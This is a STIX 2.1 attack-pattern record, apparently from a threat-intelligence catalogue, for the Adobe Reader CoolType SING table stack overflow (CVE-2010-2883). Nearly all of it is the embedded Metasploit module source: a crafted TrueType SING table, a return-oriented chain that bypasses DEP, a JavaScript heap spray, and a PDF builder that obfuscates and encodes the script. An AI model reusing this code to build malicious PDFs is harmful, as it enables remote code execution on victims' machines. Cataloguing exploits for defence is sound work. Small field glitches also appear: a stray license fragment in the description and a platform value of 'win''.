{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--02c7b906-801a-4c88-8b96-4544a53a730e",
    "created": "2024-08-14T16:36:37.156398Z",
    "modified": "2024-08-14T16:36:37.156402Z",
    "name": "Adobe CoolType SING Table \"uniqueName\" Stack Buffer Overflow",
    "description": " This module exploits a vulnerability in the Smart INdependent Glyplets (SING) table handling within versions 8.2.4 and 9.3.4 of Adobe Reader. Prior versions are assumed to be vulnerable as well.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/adobe_cooltype_sing.rb",
            "external_id": "adobe_cooltype_sing.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-2883"
        },
        {
            "source_name": "reference",
            "url": "http://contagiodump.blogspot.com/2010/09/cve-david-leadbetters-one-point-lesson.html"
        },
        {
            "source_name": "reference",
            "url": "http://www.adobe.com/support/security/advisories/apsa10-02.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'zlib'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking # aslr+dep bypass, js heap spray, rop, stack bof\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Adobe CoolType SING Table \"uniqueName\" Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a vulnerability in the Smart INdependent Glyplets (SING) table\n        handling within versions 8.2.4 and 9.3.4 of Adobe Reader. Prior versions are\n        assumed to be vulnerable as well.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Unknown',    # 0day found in the wild\n          'sn0wfl0w',   # initial analysis, also @vicheck on twitter\n          'jduck'       # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2010-2883' ],\n          [ 'OSVDB', '67849'],\n          [ 'URL', 'http://contagiodump.blogspot.com/2010/09/cve-david-leadbetters-one-point-lesson.html' ],\n          [ 'URL', 'http://www.adobe.com/support/security/advisories/apsa10-02.html' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC'             => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n          'DisablePayloadHandler' => true\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1000,\n          'BadChars' => \"\\x00\",\n          'DisableNops' => true\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # Tested OK via Adobe Reader 9.3.4 on Windows XP SP3 -jjd\n          # Tested OK via Adobe Reader 9.3.4 on Windows 7 -jjd\n          # Tested OK via Adobe Reader 9.3 on XP and 7 -todb\n          [ 'Automatic', { }],\n        ],\n      'DisclosureDate' => '2010-09-07',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.pdf']),\n      ])\n  end\n\n  def exploit\n    ttf_data = make_ttf()\n\n    js_data = make_js(payload.encoded)\n\n    # Create the pdf\n    pdf = make_pdf(ttf_data, js_data)\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file...\")\n\n    file_create(pdf)\n  end\n\n  def make_ttf\n    ttf_data = \"\"\n\n    # load the static ttf file\n\n    # NOTE: The 0day used Vera.ttf (785d2fd45984c6548763ae6702d83e20)\n    path = File.join( Msf::Config.data_directory, \"exploits\", \"cve-2010-2883.ttf\" )\n    fd = File.open( path, \"rb\" )\n    ttf_data = fd.read(fd.stat.size)\n    fd.close\n\n    # Build the SING table\n    sing = ''\n    sing << [\n      0, 1,   # tableVersionMajor, tableVersionMinor (0.1)\n      0xe01,  # glyphletVersion\n      0x100,  # embeddingInfo\n      0,      # mainGID\n      0,      # unitsPerEm\n      0,      # vertAdvance\n      0x3a00  # vertOrigin\n    ].pack('vvvvvvvv')\n    # uniqueName\n    # \"The uniqueName string must be a string of at most 27 7-bit ASCII characters\"\n    #sing << \"A\" * (0x254 - sing.length)\n    sing << rand_text(0x254 - sing.length)\n\n    # 0xffffffff gets written here @ 0x7001400 (in BIB.dll)\n    sing[0x140, 4] = [0x4a8a08e2 - 0x1c].pack('V')\n\n    # This becomes our new EIP (puts esp to stack buffer)\n    ret = 0x4a80cb38 # add ebp, 0x794 / leave / ret\n    sing[0x208, 4] = [ret].pack('V')\n\n    # This becomes the new eip after the first return\n    ret = 0x4a82a714\n    sing[0x18, 4] = [ret].pack('V')\n\n    # This becomes the new esp after the first return\n    esp = 0x0c0c0c0c\n    sing[0x1c, 4] = [esp].pack('V')\n\n    # Without the following, sub_801ba57 returns 0.\n    sing[0x24c, 4] = [0x6c].pack('V')\n\n    ttf_data[0xec, 4] = \"SING\"\n    ttf_data[0x11c, sing.length] = sing\n\n    ttf_data\n  end\n\n  def make_js(encoded_payload)\n\n    # The following executes a ret2lib using icucnv36.dll\n    # The effect is to bypass DEP and execute the shellcode in an indirect way\n    stack_data = [\n      0x41414141,   # unused\n      0x4a8063a5,   # pop ecx / ret\n      0x4a8a0000,   # becomes ecx\n\n      0x4a802196,   # mov [ecx],eax / ret # save whatever eax starts as\n\n      0x4a801f90,   # pop eax / ret\n      0x4a84903c,   # becomes eax (import for CreateFileA)\n\n      # -- call CreateFileA\n      0x4a80b692,   # jmp [eax]\n\n      0x4a801064,   # ret\n\n      0x4a8522c8,   # first arg to CreateFileA (lpFileName / pointer to \"iso88591\")\n      0x10000000,   # second arg  - dwDesiredAccess\n      0x00000000,   # third arg   - dwShareMode\n      0x00000000,   # fourth arg  - lpSecurityAttributes\n      0x00000002,   # fifth arg   - dwCreationDisposition\n      0x00000102,   # sixth arg   - dwFlagsAndAttributes\n      0x00000000,   # seventh arg - hTemplateFile\n\n      0x4a8063a5,   # pop ecx / ret\n      0x4a801064,   # becomes ecx\n\n      0x4a842db2,   # xchg eax,edi / ret\n\n      0x4a802ab1,   # pop ebx / ret\n      0x00000008,   # becomes ebx - offset to modify\n\n      #\n      # This points at a neat-o block of code that ... TBD\n      #\n      #   and [esp+ebx*2],edi\n      #   jne check_slash\n      # ret_one:\n      #   mov al,1\n      #   ret\n      # check_slash:\n      #   cmp al,0x2f\n      #   je ret_one\n      #   cmp al,0x41\n      #   jl check_lower\n      #   cmp al,0x5a\n      #   jle check_ptr\n      # check_lower:\n      #   cmp al,0x61\n      #   jl ret_zero\n      #   cmp al,0x7a\n      #   jg ret_zero\n      #   cmp [ecx+1],0x3a\n      #   je ret_one\n      # ret_zero:\n      #   xor al,al\n      #   ret\n      #\n\n      0x4a80a8a6,   # execute fun block\n\n      0x4a801f90,   # pop eax / ret\n      0x4a849038,   # becomes eax (import for CreateFileMappingA)\n\n      # -- call CreateFileMappingA\n      0x4a80b692,   # jmp [eax]\n\n      0x4a801064,   # ret\n\n      0xffffffff,   # arguments to CreateFileMappingA, hFile\n      0x00000000,   # lpAttributes\n      0x00000040,   # flProtect\n      0x00000000,   # dwMaximumSizeHigh\n      0x00010000,   # dwMaximumSizeLow\n      0x00000000,   # lpName\n\n      0x4a8063a5,   # pop ecx / ret\n      0x4a801064,   # becomes ecx\n\n      0x4a842db2,   # xchg eax,edi / ret\n\n      0x4a802ab1,   # pop ebx / ret\n      0x00000008,   # becomes ebx - offset to modify\n\n      0x4a80a8a6,   # execute fun block\n\n      0x4a801f90,   # pop eax / ret\n      0x4a849030,   # becomes eax (import for MapViewOfFile\n\n      # -- call MapViewOfFile\n      0x4a80b692,   # jmp [eax]\n\n      0x4a801064,   # ret\n\n      0xffffffff,   # args to MapViewOfFile - hFileMappingObject\n      0x00000022,   # dwDesiredAccess\n      0x00000000,   # dwFileOffsetHigh\n      0x00000000,   # dwFileOffsetLow\n      0x00010000,   # dwNumberOfBytesToMap\n\n      0x4a8063a5,   # pop ecx / ret\n      0x4a8a0004,   # becomes ecx - writable pointer\n\n      0x4a802196,   # mov [ecx],eax / ret - save map base addr\n\n      0x4a8063a5,   # pop ecx / ret\n      0x4a801064,   # becomes ecx - ptr to ret\n\n      0x4a842db2,   # xchg eax,edi / ret\n\n      0x4a802ab1,   # pop ebx / ret\n      0x00000030,   # becomes ebx - offset to modify\n\n      0x4a80a8a6,   # execute fun block\n\n      0x4a801f90,   # pop eax / ret\n      0x4a8a0004,   # becomes eax - saved file mapping ptr\n\n      0x4a80a7d8,   # mov eax,[eax] / ret - load saved mapping ptr\n\n      0x4a8063a5,   # pop ecx / ret\n      0x4a801064,   # becomes ecx - ptr to ret\n\n      0x4a842db2,   # xchg eax,edi / ret\n\n      0x4a802ab1,   # pop ebx / ret\n      0x00000020,   # becomes ebx - offset to modify\n\n      0x4a80a8a6,   # execute fun block\n\n      0x4a8063a5,   # pop ecx / ret\n      0x4a801064,   # becomes ecx - ptr to ret\n\n      0x4a80aedc,   # lea edx,[esp+0xc] / push edx / push eax / push [esp+0xc] / push [0x4a8a093c] / call ecx / add esp, 0x10 / ret\n\n      0x4a801f90,   # pop eax / ret\n      0x00000034,   # becomes eax\n\n      0x4a80d585,   # add eax,edx / ret\n\n      0x4a8063a5,   # pop ecx / ret\n      0x4a801064,   # becomes ecx - ptr to ret\n\n      0x4a842db2,   # xchg eax,edi / ret\n\n      0x4a802ab1,   # pop ebx / ret\n      0x0000000a,   # becomes ebx - offset to modify\n\n      0x4a80a8a6,   # execute fun block\n\n      0x4a801f90,   # pop eax / ret\n      0x4a849170,   # becomes eax (import for memcpy)\n\n      # -- call memcpy\n      0x4a80b692,   # jmp [eax]\n\n      0xffffffff,   # this stuff gets overwritten by the block at 0x4a80aedc, becomes ret from memcpy\n      0xffffffff,   # becomes first arg to memcpy (dst)\n      0xffffffff,   # becomes second arg to memcpy (src)\n      0x00001000,   # becomes third arg to memcpy (length)\n      #0x0000258b,   # ??\n      #0x4d4d4a8a,   # ??\n    ].pack('V*')\n\n    var_unescape  = rand_text_alpha(rand(100) + 1)\n    var_shellcode = rand_text_alpha(rand(100) + 1)\n\n    var_start     = rand_text_alpha(rand(100) + 1)\n\n    var_s         = 0x10000\n    var_c         = rand_text_alpha(rand(100) + 1)\n    var_b         = rand_text_alpha(rand(100) + 1)\n    var_d         = rand_text_alpha(rand(100) + 1)\n    var_3         = rand_text_alpha(rand(100) + 1)\n    var_i         = rand_text_alpha(rand(100) + 1)\n    var_4         = rand_text_alpha(rand(100) + 1)\n\n    payload_buf = ''\n    payload_buf << stack_data\n    payload_buf << encoded_payload\n\n    escaped_payload = Rex::Text.to_unescape(payload_buf)\n\n    js = %Q|\nvar #{var_unescape} = unescape;\nvar #{var_shellcode} = #{var_unescape}( '#{escaped_payload}' );\nvar #{var_c} = #{var_unescape}( \"%\" + \"u\" + \"0\" + \"c\" + \"0\" + \"c\" + \"%u\" + \"0\" + \"c\" + \"0\" + \"c\" );\nwhile (#{var_c}.length + 20 + 8 < #{var_s}) #{var_c}+=#{var_c};\n#{var_b} = #{var_c}.substring(0, (0x0c0c-0x24)/2);\n#{var_b} += #{var_shellcode};\n#{var_b} += #{var_c};\n#{var_d} = #{var_b}.substring(0, #{var_s}/2);\nwhile(#{var_d}.length < 0x80000) #{var_d} += #{var_d};\n#{var_3} = #{var_d}.substring(0, 0x80000 - (0x1020-0x08) / 2);\nvar #{var_4} = new Array();\nfor (#{var_i}=0;#{var_i}<0x1f0;#{var_i}++) #{var_4}[#{var_i}]=#{var_3}+\"s\";\n|\n\n    js\n  end\n\n  def random_non_ascii_string(count)\n    result = \"\"\n    count.times do\n      result << (rand(128) + 128).chr\n    end\n    result\n  end\n\n  def io_def(id)\n    \"%d 0 obj \\n\" % id\n  end\n\n  def io_ref(id)\n    \"%d 0 R\" % id\n  end\n\n\n  #http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/\n  def n_obfu(str)\n    #return str\n    result = \"\"\n    str.scan(/./u) do |c|\n      if rand(2) == 0 and c.upcase >= 'A' and c.upcase <= 'Z'\n        result << \"#%x\" % c.unpack(\"C*\")[0]\n      else\n        result << c\n      end\n    end\n    result\n  end\n\n\n  def ascii_hex_whitespace_encode(str)\n    result = \"\"\n    whitespace = \"\"\n    str.each_byte do |b|\n      result << whitespace << \"%02x\" % b\n      whitespace = \" \" * (rand(3) + 1)\n    end\n    result << \">\"\n  end\n\n\n  def make_pdf(ttf, js)\n\n    #swf_name = rand_text_alpha(8 + rand(8)) + \".swf\"\n\n    xref = []\n    eol = \"\\n\"\n    endobj = \"endobj\" << eol\n\n    # Randomize PDF version?\n    pdf = \"%PDF-1.5\" << eol\n    pdf << \"%\" << random_non_ascii_string(4) << eol\n\n    # catalog\n    xref << pdf.length\n    pdf << io_def(1) << n_obfu(\"<<\") << eol\n    pdf << n_obfu(\"/Pages \") << io_ref(2) << eol\n    pdf << n_obfu(\"/Type /Catalog\") << eol\n    pdf << n_obfu(\"/OpenAction \") << io_ref(11) << eol\n    # The AcroForm is required to get icucnv36.dll to load\n    pdf << n_obfu(\"/AcroForm \") << io_ref(13) << eol\n    pdf << n_obfu(\">>\") << eol\n    pdf << endobj\n\n    # pages array\n    xref << pdf.length\n    pdf << io_def(2) << n_obfu(\"<<\") << eol\n    pdf << n_obfu(\"/MediaBox \") << io_ref(3) << eol\n    pdf << n_obfu(\"/Resources \") << io_ref(4) << eol\n    pdf << n_obfu(\"/Kids [\") << io_ref(5) << \"]\" << eol\n    pdf << n_obfu(\"/Count 1\") << eol\n    pdf << n_obfu(\"/Type /Pages\") << eol\n    pdf << n_obfu(\">>\") << eol\n    pdf << endobj\n\n    # media box\n    xref << pdf.length\n    pdf << io_def(3)\n    pdf << \"[0 0 595 842]\" << eol\n    pdf << endobj\n\n    # resources\n    xref << pdf.length\n    pdf << io_def(4)\n    pdf << n_obfu(\"<<\") << eol\n    pdf << n_obfu(\"/Font \") << io_ref(6) << eol\n    pdf << \">>\" << eol\n    pdf << endobj\n\n    # page 1\n    xref << pdf.length\n    pdf << io_def(5) << n_obfu(\"<<\") << eol\n    pdf << n_obfu(\"/Parent \") << io_ref(2) << eol\n    pdf << n_obfu(\"/MediaBox \") << io_ref(3) << eol\n    pdf << n_obfu(\"/Resources \") << io_ref(4) << eol\n    pdf << n_obfu(\"/Contents [\") << io_ref(8) << n_obfu(\"]\") << eol\n    pdf << n_obfu(\"/Type /Page\") << eol\n    pdf << n_obfu(\">>\") << eol # end obj dict\n    pdf << endobj\n\n    # font\n    xref << pdf.length\n    pdf << io_def(6) << n_obfu(\"<<\") << eol\n    pdf << n_obfu(\"/F1 \") << io_ref(7) << eol\n    pdf << \">>\" << eol\n    pdf << endobj\n\n    # ttf object\n    xref << pdf.length\n    pdf << io_def(7) << n_obfu(\"<<\") << eol\n    pdf << n_obfu(\"/Type /Font\") << eol\n    pdf << n_obfu(\"/Subtype /TrueType\") << eol\n    pdf << n_obfu(\"/Name /F1\") << eol\n    pdf << n_obfu(\"/BaseFont /Cinema\") << eol\n    pdf << n_obfu(\"/Widths []\") << eol\n    pdf << n_obfu(\"/FontDescriptor \") << io_ref(9)\n    pdf << n_obfu(\"/Encoding /MacRomanEncoding\")\n    pdf << n_obfu(\">>\") << eol\n    pdf << endobj\n\n    # page content\n    content = \"Hello World!\"\n    content = \"\" +\n      \"0 g\" + eol +\n      \"BT\" + eol +\n      \"/F1 32 Tf\" + eol +\n      \"32 Tc\" + eol +\n      \"1 0 0 1 32 773.872 Tm\" + eol +\n      \"(\" + content + \") Tj\" + eol +\n      \"ET\"\n\n    xref << pdf.length\n    pdf << io_def(8) << \"<<\" << eol\n    pdf << n_obfu(\"/Length %s\" % content.length) << eol\n    pdf << \">>\" << eol\n    pdf << \"stream\" << eol\n    pdf << content << eol\n    pdf << \"endstream\" << eol\n    pdf << endobj\n\n    # font descriptor\n    xref << pdf.length\n    pdf << io_def(9) << n_obfu(\"<<\")\n    pdf << n_obfu(\"/Type/FontDescriptor/FontName/Cinema\")\n    pdf << n_obfu(\"/Flags %d\" % (2**2 + 2**6 + 2**17))\n    pdf << n_obfu(\"/FontBBox [-177 -269 1123 866]\")\n    pdf << n_obfu(\"/FontFile2 \") << io_ref(10)\n    pdf << n_obfu(\">>\") << eol\n    pdf << endobj\n\n    # ttf stream\n    xref << pdf.length\n    compressed = Zlib::Deflate.deflate(ttf)\n    pdf << io_def(10) << n_obfu(\"<</Length %s/Filter/FlateDecode/Length1 %s>>\" % [compressed.length, ttf.length]) << eol\n    pdf << \"stream\" << eol\n    pdf << compressed << eol\n    pdf << \"endstream\" << eol\n    pdf << endobj\n\n    # js action\n    xref << pdf.length\n    pdf << io_def(11) << n_obfu(\"<<\")\n    pdf << n_obfu(\"/Type/Action/S/JavaScript/JS \") + io_ref(12)\n    pdf << n_obfu(\">>\") << eol\n    pdf << endobj\n\n    # js stream\n    xref << pdf.length\n    compressed = Zlib::Deflate.deflate(ascii_hex_whitespace_encode(js))\n    pdf << io_def(12) << n_obfu(\"<</Length %s/Filter[/FlateDecode/ASCIIHexDecode]>>\" % compressed.length) << eol\n    pdf << \"stream\" << eol\n    pdf << compressed << eol\n    pdf << \"endstream\" << eol\n    pdf << endobj\n\n    ###\n    # The following form related data is required to get icucnv36.dll to load\n    ###\n\n    # form object\n    xref << pdf.length\n    pdf << io_def(13)\n    pdf << n_obfu(\"<</XFA \") << io_ref(14) << n_obfu(\">>\") << eol\n    pdf << endobj\n\n    # form stream\n    xfa = <<-EOF\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<xdp:xdp xmlns:xdp=\"http://ns.adobe.com/xdp/\">\n<config xmlns=\"http://www.xfa.org/schema/xci/2.6/\">\n<present><pdf><interactive>1</interactive></pdf></present>\n</config>\n<template xmlns=\"http://www.xfa.org/schema/xfa-template/2.6/\">\n<subform name=\"form1\" layout=\"tb\" locale=\"en_US\">\n<pageSet></pageSet>\n</subform></template></xdp:xdp>\nEOF\n\n    xref << pdf.length\n    pdf << io_def(14) << n_obfu(\"<</Length %s>>\" % xfa.length) << eol\n    pdf << \"stream\" << eol\n    pdf << xfa << eol\n    pdf << \"endstream\" << eol\n    pdf << endobj\n\n    ###\n    # end form stuff for icucnv36.dll\n    ###\n\n\n    # trailing stuff\n    xrefPosition = pdf.length\n    pdf << \"xref\" << eol\n    pdf << \"0 %d\" % (xref.length + 1) << eol\n    pdf << \"0000000000 65535 f\" << eol\n    xref.each do |index|\n      pdf << \"%010d 00000 n\" % index << eol\n    end\n\n    pdf << \"trailer\" << eol\n    pdf << n_obfu(\"<</Size %d/Root \" % (xref.length + 1)) << io_ref(1) << \">>\" << eol\n\n    pdf << \"startxref\" << eol\n    pdf << xrefPosition.to_s() << eol\n\n    pdf << \"%%EOF\" << eol\n    pdf\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-09-07",
    "x_mitre_platforms": [
        "win'"
    ]
}